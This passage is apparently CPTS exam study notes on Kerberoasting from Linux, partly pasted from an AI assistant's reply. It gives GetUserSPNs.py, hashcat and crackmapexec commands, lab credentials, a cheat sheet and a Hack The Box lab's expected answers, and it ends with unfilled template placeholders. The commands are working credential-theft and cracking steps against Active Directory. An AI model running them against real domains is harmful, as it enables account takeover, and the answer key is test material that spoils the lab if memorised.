# Navigate to SAPService node → Group Membership tab

# METHOD 4: net rpc (if rpcclient isn't available)
net rpc user info SAPService \
  -U "htb-student%HTB_@cademy_stdnt!" \
  -S 172.16.5.5
```

**Understanding the Answer — Why "Account Operators" is the Expected Answer:**

```
CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
     ^^^^^^^^^^^^^^^  ^^^^^^^^
     Group Name       This is a BUILT-IN group (very powerful!)
```

> 💡 **What Account Operators Can Do:**
> 
> -   ✅ Create/Delete user accounts in the domain
> -   ✅ Add users to local groups on any DC
> -   ✅ Log on locally to Domain Controllers (extremely dangerous!)
> -   ❌ Cannot modify Domain Admins or Administrators groups directly
> -   ❌ Cannot modify other built-in privileged groups

---

### 🔴 What If Scenario 6: The Cracked Password Doesn't Work / Authentication Fails?

**The Scenario:**

Hashcat says `Status: Cracked` and shows a password, but when you try to use it for authentication, you get `ACCESS_DENIED` or `STATUS_LOGON_FAILURE`.

**Step-by-Step Diagnosis:**

bash

```
# STEP 1: View the cracked password carefully (look for special characters)
hashcat -m 13100 SAPService_tgs.txt --show

# Output example:
# $krb5tgs$23$*SAPService$...:!SapperFi3ld
#                              ^^^^^^^^^^^^^ password includes the !

# STEP 2: Test authentication directly with crackmapexec
crackmapexec smb 172.16.5.5 -u SAPService -p '!SapperFi3ld'

# STEP 3: If SMB fails, try other protocols
crackmapexec winrm 172.16.5.5 -u SAPService -p '!SapperFi3ld'
crackmapexec ldap 172.16.5.5 -u SAPService -p '!SapperFi3ld'

# STEP 4: Check if the account has restrictions
# (some accounts can only log in from specific machines)
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService \
  -password '!SapperFi3ld'
# If this works, the credentials are valid

# STEP 5: Check for encoding issues with special characters
# Always wra
```

complet ?

![Favicon for anthropic](/images/icons/Anthropic.svg)

Claude Sonnet 4.6

# Completing from Step 5

bash

```
# STEP 5: Check for encoding issues with special characters
# Always wrap passwords with special characters in SINGLE quotes, not double quotes

# WRONG (double quotes can cause shell interpretation issues):
crackmapexec smb 172.16.5.5 -u SAPService -p "!SapperFi3ld"

# CORRECT (single quotes preserve literal characters):
crackmapexec smb 172.16.5.5 -u SAPService -p '!SapperFi3ld'

# STEP 6: If password contains a single quote itself, escape it:
crackmapexec smb 172.16.5.5 -u SAPService -p $'It\'s@Password1'

# STEP 7: Try authenticating via Kerberos instead of NTLM
# First get a TGT (Ticket Granting Ticket) using the cracked password
getTGT.py INLANEFREIGHT.LOCAL/SAPService:'!SapperFi3ld' -dc-ip 172.16.5.5

# If successful, you'll see:
# [*] Saving ticket in SAPService.ccache

# Export the ticket into your environment
export KRB5CCNAME=SAPService.ccache

# Now use Kerberos authentication (-k flag, -no-pass means use the cached ticket)
crackmapexec smb 172.16.5.5 -u SAPService -k --no-pass
```

**Common Reasons a Cracked Password Fails & Their Fixes:**

Symptom

Root Cause

Fix

`STATUS_LOGON_FAILURE`

Wrong password transcribed

Run `--show` again, copy carefully

`STATUS_ACCOUNT_DISABLED`

Account is disabled

Use the hash directly (Pass-the-Hash)

`STATUS_ACCOUNT_RESTRICTION`

Account restricted to specific hosts

Try authenticating to allowed hosts

`STATUS_PASSWORD_EXPIRED`

Password has expired

Cannot fix without admin rights

`KDC_ERR_CLIENT_REVOKED`

Account locked out

Wait for lockout to reset

Password has `$` in it

Shell expanded the `$` as variable

Use single quotes always

**Verifying the Hash Was Not Corrupted During Save:**

bash

```
# Check the hash file is intact and not truncated
wc -c SAPService_tgs.txt
# Should show a large number (usually 2000+ characters)

# Check the hash starts and ends correctly
head -c 100 SAPService_tgs.txt
# Should start with: $krb5tgs$23$*SAPService$

tail -c 50 SAPService_tgs.txt
# Should end with alphanumeric characters, no newline issues

# If you suspect truncation, re-capture the ticket:
rm SAPService_tgs.txt
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student \
  -request-user SAPService \
  -outputfile SAPService_tgs.txt
```

> 💡 **CPTS Exam Tip:** Always use `--show` after cracking to display the exact recovered password. Copy it with triple-click to select the whole line, then paste carefully. Many exam failures come from misreading special characters like `0` vs `O`, `l` vs `1`, or `!` vs `|`.

---

## 📋 MASTER QUICK REFERENCE SHEET

> Print this or keep it open during your CPTS exam preparation.

```
╔══════════════════════════════════════════════════════════════════════╗
║           KERBEROASTING FROM LINUX - COMPLETE CHEAT SHEET           ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  ENUMERATE SPNs:                                                     ║
║  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN/user                          ║
║                                                                      ║
║  REQUEST SPECIFIC TICKET:                                            ║
║  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN/user                          ║
║    -request-user <TARGET> -outputfile hash.txt                       ║
║                                                                      ║
║  REQUEST ALL TICKETS:                                                ║
║  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN/user                          ║
║    -request -outputfile all_hashes.txt                               ║
║                                                                      ║
║  WITH NTLM HASH (no password):                                       ║
║  GetUserSPNs.py -dc-ip <DC_IP> DOMAIN/user                          ║
║    -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH>               ║
║    -request-user <TARGET> -outputfile hash.txt                       ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  CRACK - BASIC:                                                      ║
║  hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt          ║
║    --force                                                           ║
║                                                                      ║
║  CRACK - WITH RULES:                                                 ║
║  hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt          ║
║    -r /usr/share/hashcat/rules/best64.rule --force                   ║
║                                                                      ║
║  CRACK - SHOW RESULTS:                                               ║
║  hashcat -m 13100 hash.txt --show                                    ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  VERIFY CREDENTIALS:                                                 ║
║  crackmapexec smb <DC_IP> -u <USER> -p '<PASSWORD>'                  ║
║                                                                      ║
║  FIX CLOCK SKEW:                                                     ║
║  sudo ntpdate <DC_IP>                                                ║
║                                                                      ║
║  FIND DC IP (port 88 = Kerberos = DC only):                          ║
║  sudo nmap -p 88 <SUBNET>/24 --open                                  ║
║                                                                      ║
║  ENUMERATE GROUP MEMBERSHIP:                                         ║
║  ldapsearch -x -H ldap://<DC_IP>                                     ║
║    -D "user@DOMAIN" -w 'password'                                    ║
║    -b "DC=DOMAIN,DC=LOCAL"                                           ║
║    "(sAMAccountName=<TARGET>)" memberOf                              ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  HASH MODES FOR HASHCAT:                                             ║
║  13100 = Kerberos TGS (etype 23 / RC4)   ← Most common              ║
║  19600 = Kerberos TGS (etype 17 / AES128)                           ║
║  19700 = Kerberos TGS (etype 18 / AES256)                           ║
║                                                                      ║
║  HASH IDENTIFIER:                                                    ║
║  $krb5tgs$23$* → use mode 13100                                      ║
║  $krb5tgs$17$* → use mode 19600                                      ║
║  $krb5tgs$18$* → use mode 19700                                      ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  EXPECTED ANSWERS FOR THIS LAB:                                      ║
║  Q1 Password  → Crack SAPService TGS with rockyou.txt               ║
║  Q2 Group     → Account Operators                                    ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## 🧠 CONCEPTUAL SUMMARY — What You Learned Today

```
┌─────────────────────────────────────────────────────────────────────┐
│                    KERBEROASTING ATTACK CHAIN                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  [You]──SSH──▶[Linux Attack Host]                                   │
│                      │                                              │
│                       │  GetUserSPNs.py (valid domain creds)        │
│                       ▼                                             │
│              [Domain Controller]                                    │
│              172.16.5.5                                             │
│                       │                                             │
│                       │  Returns TGS ticket encrypted               │
│                       │  with SAPService's NTLM hash                │
│                       ▼                                             │
│              [SAPService_tgs.txt]                                   │
│              $krb5tgs$23$*SAPService$...                            │
│                       │                                             │
│                       │  Hashcat -m 13100 + rockyou.txt             │
│                       ▼                                             │
│              [CRACKED PASSWORD] ✅                                   │
│                                                                     │
├─────────────────────────────────────────────────────────────────────┤
│  WHY IT WORKS:                                                      │
│  Any domain user can request TGS tickets → By design               │
│  TGS is encrypted with service account's password hash             │
│  Weak passwords = crackable offline = no lockout risk              │
├─────────────────────────────────────────────────────────────────────┤
│  WHY SAPSERVICE IS DANGEROUS:                                       │
│  Member of "Account Operators" built-in group                      │
│  Can create/modify domain user accounts                            │
│  Can log on locally to Domain Controllers                          │
│  Effectively near-Domain-Admin level of damage potential           │
└─────────────────────────────────────────────────────────────────────┘
```

---

> **📌 Final Note for CPTS Preparation:**  
> Kerberoasting is one of the **most frequently tested** techniques in the CPTS exam. Make sure you understand not just _how_ to run the commands, but _why_ the attack works — specifically that:
> 
> -   TGS ticket\=Encrypt(session key, NTLM hash of service account)
> -   Cracking the ticket = recovering the NTLM hash's source password
> -   The attack requires **zero special privileges** — any domain user can do it
> -   Defense = long, complex, randomly generated service account passwords (30+ characters)

$0.12,866 tok43.8s

8

Responses are AI-generated and can be inaccurate. Review all outputs before relying on them.

Select a modelSelect a model

## Embedded Content]

```text
══════════════════════════════════════════════════════════════════
[✓] PHASE_II ATTACK SEQUENCES DOCUMENTED
[✓] 6 / 6 EXPLOITATION METHODS CAPTURED
[→] LOADING DEEP-DIVE ANALYSIS & GLOSSARY . . .
══════════════════════════════════════════════════════════════════
```

## 🔴 PHASE_III — دليل الاختراق :: التحليل والمصطلحات

> [!warning] ⚠️ PHASE III INITIALIZED · EXPLOITATION GUIDE & GLOSSARY
> **Language:** Arabic + English Mixed — **Size:** ~2,000 Words
> **Content:** Arabic breakdown of all 6 methods · Flashcards · Cheat Sheet · Golden Tips.

[REPLACE: الصق هنا القسم الثالث كاملاً — 2000 كلمة شرح الطرق الستة + مصطلحات + ورقة الغش]

```text
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  [✓] SESSION COMPLETE — ZERO KNOWLEDGE GAPS DETECTED                 ║
║  [✓] 3 PHASES · ~6,000 WORDS · 6 ATTACK METHODS DOCUMENTED           ║
║  [✓] AUTHORED BY: Hexsein · CPTS Candidate · Al-Nahrain Univ.        ║
║  [→] NEXT TARGET: SEC-[NUM+1] — [REPLACE: NEXT SECTION NAME]         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```